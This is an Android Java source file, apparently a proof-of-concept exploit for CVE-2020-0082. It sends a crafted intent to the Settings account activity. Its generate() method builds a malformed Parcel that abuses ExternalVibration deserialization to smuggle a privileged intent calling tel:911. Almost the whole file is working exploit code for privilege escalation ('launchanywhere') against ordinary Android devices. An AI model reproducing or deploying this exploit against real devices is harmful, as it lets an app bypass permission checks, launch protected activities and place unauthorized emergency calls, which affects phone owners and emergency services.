package com.expl.cve_2020_0082;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Binder;
import android.os.Bundle;
import android.os.Parcel;
import android.view.View;
import android.widget.Button;

import java.lang.reflect.InvocationTargetException;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btn = findViewById(R.id.button);
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("com.android.settings", "com.android.settings.accounts.AddAccountSettings"));
                intent.setAction(Intent.ACTION_RUN);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.putExtra("account_types", new String[] { getPackageName() });
                startActivity(intent);
            }
        });
    }


    public static Parcel generate() {
        Parcel data = Parcel.obtain();
        data.writeInterfaceToken("android.accounts.IAccountAuthenticatorResponse");
        data.writeInt(1);
        int bundleLenPos = data.dataPosition();
        data.writeInt(0xffffffff);
        data.writeInt(0x4C444E42);

        int bundleStartPos = data.dataPosition();
        data.writeInt(3);

        data.writeString("launchanywhere");
        data.writeInt(16); // VAL_PARCELABLEARRAY

        int ParcelableArrayLength = 3;
        data.writeInt(ParcelableArrayLength + 1);
        data.writeString("android.os.ExternalVibration");
        data.writeInt(1000); // mUid
        data.writeString(null); // mPkg

        // writeAudioAttributes

        data.writeInt(0);
        data.writeInt(0);
        data.writeInt(0);
        data.writeInt(0);

        data.writeStrongBinder(new Binder()); // mController.asBinder
        data.writeStrongBinder(new Binder()); // mToken


        // items in array just a dummy for padding
        int realByteArrayLenPos = 0;
        int realByteArrayStartPos = 0;
        for (int i = 0; i < ParcelableArrayLength; i++) {
            data.writeString("android.app.usage.AppStandbyInfo");
            if (i == 1) {
                data.writeInt(3);
                data.writeInt(13);
                realByteArrayLenPos = data.dataPosition();
                data.writeInt(0x84);
                realByteArrayStartPos = data.dataPosition();
                data.writeInt(0);
            } else {
                data.writeString(null);
                data.writeInt(0xbad1dea);
            }
        }

        data.writeInt(1);
        data.writeInt(6);
        data.writeInt(13);
        int byteArrayLenPos = data.dataPosition();
        data.writeInt(0xffffffff);
        int byteArrayStartPos = data.dataPosition();
        data.writeInt(0);
        data.writeInt(0);
        data.writeInt(0);
        data.writeInt(0);
        data.writeInt(0);
        data.writeInt(0);

        int realByteArrayEndPos = data.dataPosition();
        data.setDataPosition(realByteArrayLenPos);
        int realByteArrayLen = realByteArrayEndPos - realByteArrayStartPos;
        data.writeInt(realByteArrayLen + 8);
        data.setDataPosition(realByteArrayEndPos);

        data.writeString("intent");
        data.writeInt(4);
        data.writeString("android.content.Intent");
        Intent evilIntent = new Intent("android.intent.action.CALL_PRIVILEGED");
        evilIntent.setData(Uri.parse("tel:911"));
        evilIntent.writeToParcel(data, 0);
        int byteArrayEndPos = data.dataPosition();
        data.setDataPosition(byteArrayLenPos);
        int byteArrayLen = byteArrayEndPos - byteArrayStartPos;
        data.writeInt(byteArrayLen);
        data.setDataPosition(byteArrayEndPos);

        int bundleEndPos = data.dataPosition();
        data.setDataPosition(bundleLenPos);
        int bundleLen = bundleEndPos - bundleStartPos;
        data.writeInt(bundleLen);
        data.setDataPosition(0);
        return data;
    }

    public static Class _forName(String name) {
        Class cls = null;
        try {
            cls = (Class) Class.class.getMethod("forName", new Class[] { String.class }).invoke(Class.class, name);
        } catch (IllegalAccessException | InvocationTargetException | NoSuchMethodException e) {
            e.printStackTrace();
        }
        return cls;
    }
}